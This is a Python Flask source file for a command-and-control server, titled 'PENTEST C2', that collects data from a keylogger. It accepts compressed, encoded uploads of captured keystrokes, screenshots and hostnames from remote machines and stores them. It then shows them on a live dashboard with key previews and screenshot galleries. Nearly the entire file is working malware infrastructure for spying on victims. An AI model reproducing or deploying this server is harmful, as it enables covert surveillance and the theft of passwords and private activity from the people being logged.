#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
import os, json, base64, zlib
from datetime import datetime
from pathlib import Path
import glob

app = Flask(__name__)
CORS(app, origins="*")

# Ensure data directories exist
DATA_DIR = Path("./data")
for subdir in ["logs", "screenshots"]:
    (DATA_DIR / subdir).mkdir(parents=True, exist_ok=True)

print(f"📁 Data directory: {DATA_DIR.absolute()}")

@app.route("/receive", methods=["POST"])
def receive():
    """Receive keylogger data"""
    try:
        data = request.get_json()
        if not data or "data" not in data:
            return jsonify({"error": "No data"}), 400
            
        session = data.get("session", "unknown")
        compressed_data = base64.b64decode(data["data"])
        payload = json.loads(zlib.decompress(compressed_data).decode('utf-8'))
        
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON log
        log_file = DATA_DIR / "logs" / f"{session}_{ts}.json"
        with open(log_file, "w") as f:
            json.dump(payload, f, indent=2)
        
        # Save screenshots (FIXED)
        screenshot_count = 0
        for i, shot in enumerate(payload.get("screenshots", [])):
            try:
                img_data = base64.b64decode(shot["data"])
                img_file = DATA_DIR / "screenshots" / f"{session}_{i}_{ts}.jpg"
                with open(img_file, "wb") as f:
                    f.write(img_data)
                screenshot_count += 1
            except Exception as e:
                print(f"Screenshot save error: {e}")
                continue
        
        print(f"📥 [{session}] {len(payload.get('keys', []))} keys, {screenshot_count} screenshots")
        
        return jsonify({
            "status": "ok", 
            "session": session, 
            "keys": len(payload.get('keys', [])),
            "screenshots": screenshot_count
        })
        
    except Exception as e:
        print(f"❌ Receive error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/")
@app.route("/dashboard")
def dashboard():
    """Live dashboard with all sessions"""
    sessions = []
    
    # Get all log files
    for log_file in sorted(DATA_DIR.glob("logs/*.json"), key=os.path.getmtime, reverse=True):
        try:
            with open(log_file) as f:
                data = json.load(f)
            session_id = log_file.stem.split("_")[0]
            sessions.append({
                "id": session_id,
                "keys": len(data.get("keys", [])),
                "screenshots": len(data.get("screenshots", [])),
                "hostname": data.get("system", {}).get("hostname", "unknown"),
                "time": datetime.fromtimestamp(log_file.stat().st_mtime).strftime("%H:%M:%S"),
                "keys_preview": json.dumps(data.get("keys", [])[-5:], indent=2)[:300]
            })
        except:
            continue
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 PENTEST C2 DASHBOARD</title>
    <meta http-equiv="refresh" content="10">
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ 
            background: #000; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            padding: 20px; 
            line-height: 1.4;
        }}
        .header {{ 
            text-align: center; 
            margin-bottom: 30px; 
            font-size: 24px; 
        }}
        .stats {{ 
            background: #111; 
            padding: 10px; 
            margin-bottom: 20px; 
            border-left: 4px solid #00ff00;
        }}
        .session {{ 
            background: #0a0a0a; 
            margin: 15px 0; 
            padding: 20px; 
            border: 1px solid #333; 
            border-radius: 5px;
        }}
        .session h3 {{ 
            color: #00ff00; 
            margin-bottom: 10px; 
            font-size: 18px;
        }}
        .keys-preview {{ 
            background: #000; 
            padding: 10px; 
            font-size: 12px; 
            max-height: 100px; 
            overflow-y: auto;
            border: 1px solid #333;
        }}
        .btn {{ 
            background: #00ff00; 
            color: #000; 
            padding: 8px 15px; 
            text-decoration: none; 
            border-radius: 3px; 
            font-size: 12px;
            margin-right: 10px;
        }}
        .screenshots-grid {{
            display: flex; flex-wrap: wrap; margin-top: 10px;
        }}
        .screenshots-grid img {{
            width: 200px; height: 150px; 
            object-fit: cover; 
            margin: 5px; 
            border: 2px solid #333;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚀 LIVE PENTEST C2</h1>
        <div class="stats">
            Active Sessions: <strong>{len(sessions)}</strong> | 
            Total Logs: <strong>{len(list(DATA_DIR.glob("logs/*.json")))}</strong> | 
            Total Screenshots: <strong>{len(list(DATA_DIR.glob("screenshots/*.jpg")))}</strong>
        </div>
    </div>
"""
    
    for session in sessions[:10]:  # Show latest 10
        screenshots = len(glob.glob(f"data/screenshots/{session['id']}*.jpg"))
        html += f"""
        <div class="session">
            <h3>🖥️ {session['hostname']} | {session['id']} 
                <span style="font-size:14px;color:#888">
                    ({session['time']}) 
                    • {session['keys']} keys 
                    • {screenshots} screenshots
                </span>
            </h3>
            <div class="keys-preview">{session['keys_preview']}...</div>
            <a href="/screenshots/{session['id']}" class="btn">📸 Screenshots</a>
            <a href="/logs/{session['id']}_latest.json" class="btn">📄 Full Log</a>
        </div>
        """
    
    html += """
    <script>
        // Auto-scroll to bottom
        window.scrollTo(0, document.body.scrollHeight);
    </script>
</body>
</html>"""
    
    return html

@app.route("/screenshots/<session>")
def screenshots(session):
    """Screenshot gallery for session"""
    img_files = []
    for img_file in DATA_DIR.glob(f"screenshots/{session}*.jpg"):
        img_files.append(str(img_file.relative_to(DATA_DIR)))
    
    html = f"""
<!DOCTYPE html>
<html><head><title>📸 Screenshots - {session}</title>
<style>
body{{background:black;color:lime;font-family:monospace;padding:30px}}
.grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:15px}}
img{{width:100%;height:200px;object-fit:cover;border:2px solid lime;border-radius:8px;cursor:pointer;transition:transform 0.2s}}
img:hover{{transform:scale(1.05);border-color:#00ff88}}
a{{color:lime;text-decoration:none;font-size:18px;margin-bottom:20px;display:block}}</style>
</head>
<body>
<a href="/">← Dashboard</a>
<h1>📸 {session} ({len(img_files)} screenshots)</h1>
<div class="grid">
"""
    
    for img_path in sorted(img_files, reverse=True):
        html += f'<img src="/{img_path}" onclick="window.open(this.src)">'
    
    html += "</div></body></html>"
    return html

@app.route("/logs/<path:filename>")
def serve_log(filename):
    """Serve log files"""
    log_path = DATA_DIR / "logs" / filename
    if log_path.exists():
        return send_from_directory(DATA_DIR / "logs", filename)
    return "File not found", 404

@app.route("/<path:filename>")
def serve_static(filename):
    """Serve screenshots and other files"""
    file_path = DATA_DIR / filename
    if file_path.exists():
        return send_from_directory(DATA_DIR, filename)
    return "File not found", 404

@app.route("/status")
def status():
    """API status"""
    return jsonify({
        "status": "alive",
        "logs": len(list(DATA_DIR.glob("logs/*.json"))),
        "screenshots": len(list(DATA_DIR.glob("screenshots/*.jpg")))
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 C2 Server running on :{port}")
    print(f"📁 Logs: {DATA_DIR / 'logs'}")
    print(f"📸 Screenshots: {DATA_DIR / 'screenshots'}")
    app.run(host="0.0.0.0", port=port, debug=False)